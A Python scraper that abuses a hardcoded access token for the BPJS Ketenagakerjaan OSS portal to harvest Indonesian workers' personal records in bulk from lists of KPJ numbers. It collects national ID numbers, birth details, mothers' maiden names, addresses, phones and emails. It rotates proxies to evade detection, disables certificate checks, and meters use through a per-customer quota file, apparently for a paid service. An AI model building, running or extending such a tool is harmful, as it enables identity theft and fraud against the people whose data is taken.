import asyncio
import os
import json
import random
import time
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from datetime import datetime, date
from typing import Dict, Any, Optional, List

import requests
import urllib3
import openpyxl
from openpyxl.styles import PatternFill, Font

# Matikan warning SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Import JMOChecker
try:
    from jmo_checker import JMOChecker
except ImportError:
    JMOChecker = None

# ====== CONFIG ======
URL_AUTH = "https://www.bpjsketenagakerjaan.go.id/oss?token=ZW1haWw9U05MTlVUUkFDRVVUSUNBTEBHTUFJTC5DT00mbmliPTAyMjA0MDAyNjA4NTY="
BASE_DIR = Path.home() / "NO2"
USERS_DIR = BASE_DIR / "users"
PROXIES_TXT = BASE_DIR / "proxies.txt"
ALLOWED_TXT = BASE_DIR / "allowed.txt"

XLSX_HEADERS = [
    "NOMOR", "KPJ", "NIK", "NAMA", "TGL_LAHIR", "TEMPAT_LAHIR", "JENIS_KELAMIN",
    "NAMA_IBU_KANDUNG", "ALAMAT", "NO_HANDPHONE", "EMAIL",
    "", "", "", "", "", "", "", "", "", # L-T (Empty)
    "CHECKER", "MSG_CHECKER" # U, V
]

# Lock untuk keamanan multi-threading
excel_lock = threading.Lock()
zonk_lock = threading.Lock()
progress_lock = threading.Lock()
quota_lock = threading.Lock()

def log(msg):
    print(f'[{datetime.now().strftime("%H:%M:%S")}] {msg}')

# ====== QUOTA HELPERS ======
def _parse_allowed_file() -> Dict[int, Dict[str, Any]]:
    users = {}
    if not ALLOWED_TXT.exists(): return users
    with open(ALLOWED_TXT, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"): continue
            parts = [p.strip() for p in line.split("|")]
            if len(parts) < 5: continue
            try:
                cid = int(parts[0])
                users[cid] = {
                    "cid": cid, "quota_total": int(parts[1]), "used": int(parts[2]),
                    "reg_date": parts[3], "expiry_date": parts[4]
                }
            except: continue
    return users

def _save_allowed_file(users: Dict[int, Dict[str, Any]]):
    with open(ALLOWED_TXT, "w", encoding="utf-8") as f:
        for cid, u in users.items():
            f.write(f"{cid}|{u['quota_total']}|{u['used']}|{u['reg_date']}|{u['expiry_date']}\n")

def _deduct_quota(cid: int) -> bool:
    """Mengurangi kuota user. Return True jika berhasil, False jika kuota habis."""
    with quota_lock:
        users = _parse_allowed_file()
        u = users.get(cid)
        if not u: return False
        if u['used'] >= u['quota_total']: return False
        u['used'] += 1
        _save_allowed_file(users)
        return True

# ====== SCRAPER ======
class OssScraper:
    def __init__(self, proxy=None):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        })
        if proxy:
            p = proxy.split(':')
            px = f"http://{p[2]}:{p[3]}@{p[0]}:{p[1]}" if len(p) == 4 else f"http://{proxy}"
            self.session.proxies = {"http": px, "https": px}

    def run_scrape(self, kpj):
        try:
            self.session.get(URL_AUTH, timeout=12, verify=False)
            res_page = self.session.get("https://www.bpjsketenagakerjaan.go.id/oss/input-tk", timeout=12, verify=False)
            csrf = re.search(r"_csrf\s*:\s*'([^']+)'", res_page.text).group(1)
            oauth = re.search(r"oauth\s*:\s*'([^']+)'", res_page.text).group(1)

            payload = {"kpj": kpj, "oauth": oauth, "_csrf": csrf}
            headers = {"X-Requested-With": "XMLHttpRequest", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
            res_cek = self.session.post("https://www.bpjsketenagakerjaan.go.id/oss/cekKPJ", data=payload, headers=headers, timeout=12, verify=False)
            status = res_cek.json()
            
            if status:
                res_step = self.session.get("https://www.bpjsketenagakerjaan.go.id/oss/input-tk-kpj-step1", timeout=12, verify=False)
                html = res_step.text
                def ex(fid):
                    m = re.search(rf'id="{fid}"[^>]*value=["\']([^"\']*)["\']', html); return m.group(1).strip() if m else ""
                def ex_s(fid):
                    b = re.search(rf'<select[^>]*id="{fid}"[^>]*>(.*?)</select>', html, re.DOTALL)
                    if b:
                        o = re.search(r'<option[^>]*selected[^>]*>(.*?)</option>', b.group(1)); return o.group(1).strip() if o else ""
                    return ""
                data = {
                    "nik": ex("no_identitas"), "nama": ex("nama_lengkap"), "tgl_lahir": ex("tgl_lahir"),
                    "tempat_lahir": ex("tempat_lahir"), "jenis_kelamin": ex_s("jenis_kelamin"),
                    "ibu_kandung": ex("ibu_kandung"), "alamat": ex("alamat"),
                    "handphone": ex("no_handphone"), "email": ex("email")
                }
                return data if data["nik"] else None
        except: return None

# ====== HELPERS ======
def _user_paths(cid: int):
    root = USERS_DIR / str(cid)
    return {
        "kpj_txt": root / "BAHAN" / "kpj.txt",
        "output_xlsx": root / "HASIL" / "list.xlsx",
        "zonk_txt": root / "ZONK" / "zonk.txt",
        "progress_json": root / "STATE" / "progress.json",
        "stop_flag": root / "STATE" / "STOP"
    }

def _update_progress_file(cid, total, done, status, last_kpj="", note=""):
    with progress_lock:
        paths = _user_paths(cid)
        h_count, z_count = 0, 0
        if paths["output_xlsx"].exists():
            try:
                wb = openpyxl.load_workbook(paths["output_xlsx"], read_only=True)
                h_count = wb.active.max_row - 1; wb.close()
            except: pass
        if paths["zonk_txt"].exists():
            try:
                with open(paths["zonk_txt"], 'r') as f: z_count = sum(1 for _ in f)
            except: pass
        data = {
            "total": total, "done": done, "status": status, "last_kpj": last_kpj,
            "note": note, "updated_at": datetime.now().isoformat(),
            "hasil_count": h_count, "zonk_count": z_count
        }
        with open(paths["progress_json"], "w") as f: json.dump(data, f, indent=2)

def _save_to_xlsx(cid, d):
    with excel_lock:
        path = _user_paths(cid)["output_xlsx"]
        if not path.exists():
            path.parent.mkdir(parents=True, exist_ok=True)
            wb = openpyxl.Workbook(); ws = wb.active; ws.append(XLSX_HEADERS)
            fill = PatternFill(start_color="00008B", end_color="00008B", fill_type="solid")
            font = Font(color="FFFFFF", bold=True)
            for c in ws[1]:
                if c.value: c.fill, c.font = fill, font
            wb.save(path)
        wb = openpyxl.load_workbook(path); ws = wb.active
        ws.append([
            ws.max_row, d.get("KPJ"), d.get("nik"), d.get("nama"), d.get("tgl_lahir"),
            d.get("tempat_lahir"), d.get("jenis_kelamin"), d.get("ibu_kandung"),
            d.get("alamat"), d.get("handphone"), d.get("email"),
            "", "", "", "", "", "", "", "", "", d.get("CHECKER"), d.get("MSG_CHECKER")
        ])
        wb.save(path)

def _save_zonk(cid, kpj, reason):
    with zonk_lock:
        path = _user_paths(cid)["zonk_txt"]
        path.parent.mkdir(parents=True, exist_ok=True)
        with open(path, 'a') as f: f.write(f"{kpj} ({reason})\n")

# ====== WORKER CORE ======
def _process_single_kpj(cid, kpj, total, idx, proxies, jmo):
    paths = _user_paths(cid)
    if paths["stop_flag"].exists(): return "stopped"

    # POTONG KUOTA DI AWAL PROSES (Setiap percobaan memotong kuota)
    if not _deduct_quota(cid):
        return "out_of_quota"

    proxy = random.choice(proxies) if proxies else None
    scraper = OssScraper(proxy)
    data = scraper.run_scrape(kpj)
    
    if data:
        if data.get("nik", "").upper().startswith("MIG"):
            log(f"  [!] Zonk (MIG): {kpj}"); _save_zonk(cid, kpj, "NIK MIG Prefix")
        else:
            log(f"  [+] Sukses: {data['nik']}"); data["KPJ"] = kpj
            if jmo:
                try:
                    c = jmo.check_status(data["nik"], kpj, data["nama"], data["tgl_lahir"])
                    data["CHECKER"], data["MSG_CHECKER"] = c.get("status"), c.get("message")
                except: data["CHECKER"] = "ERROR"
            _save_to_xlsx(cid, data)
    else:
        log(f"  [!] Gagal/Kosong: {kpj}"); _save_zonk(cid, kpj, "Data Kosong / Error")
    
    return "ok"

# ====== MAIN CONTROL ======
def _sync_run(cid, _drv):
    log(f'Starting optimized worker for user {cid}...')
    paths = _user_paths(cid)
    if not paths["kpj_txt"].exists(): return "no_bahan"
    with open(paths["kpj_txt"], 'r') as f:
        kpjs = [l.strip() for l in f if l.strip()]
    if not kpjs: return "no_bahan"

    processed = set()
    if paths["output_xlsx"].exists():
        try:
            wb = openpyxl.load_workbook(paths["output_xlsx"], read_only=True)
            for r in wb.active.iter_rows(min_row=2, values_only=True):
                if r and r[1]: processed.add(str(r[1]).strip())
            wb.close()
        except: pass
    if paths["zonk_txt"].exists():
        with open(paths["zonk_txt"], 'r') as f:
            for l in f: processed.add(l.strip().split(' ')[0])

    kpjs_to_process = [k for k in kpjs if k not in processed]
    total = len(kpjs)
    proxies = []
    if PROXIES_TXT.exists():
        with open(PROXIES_TXT, 'r') as f: proxies = [l.strip() for l in f if l.strip()]
    jmo = JMOChecker() if JMOChecker else None
    
    max_workers = 5
    done_count = total - len(kpjs_to_process)
    quota_exhausted = False

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = []
        for idx, kpj in enumerate(kpjs_to_process):
            if paths["stop_flag"].exists(): break
            
            futures.append(executor.submit(_process_single_kpj, cid, kpj, total, idx, proxies, jmo))
            
            if len(futures) >= max_workers:
                for future in futures:
                    res = future.result()
                    if res == "out_of_quota": quota_exhausted = True
                    done_count += 1
                futures = []
                _update_progress_file(cid, total, done_count, "running", kpj)
                if quota_exhausted: break
        
        for future in futures:
            res = future.result()
            if res == "out_of_quota": quota_exhausted = True
            done_count += 1
            _update_progress_file(cid, total, done_count, "running", "Finishing...")

    if quota_exhausted:
        log(f"Quota habis untuk user {cid}. Berhenti.")
        _update_progress_file(cid, total, done_count, "stopped", note="Quota Habis")
        return "finished" # Tetap finished agar bot mengirim pesan terakhir
    elif paths["stop_flag"].exists():
        paths["stop_flag"].unlink()
        _update_progress_file(cid, total, done_count, "stopped", note="Diberhentikan")
        return "stopped"
    else:
        _update_progress_file(cid, total, total, "finished")
    
    return "finished"

async def run(cid: int, driver: Any = None):
    return await asyncio.to_thread(_sync_run, cid, driver)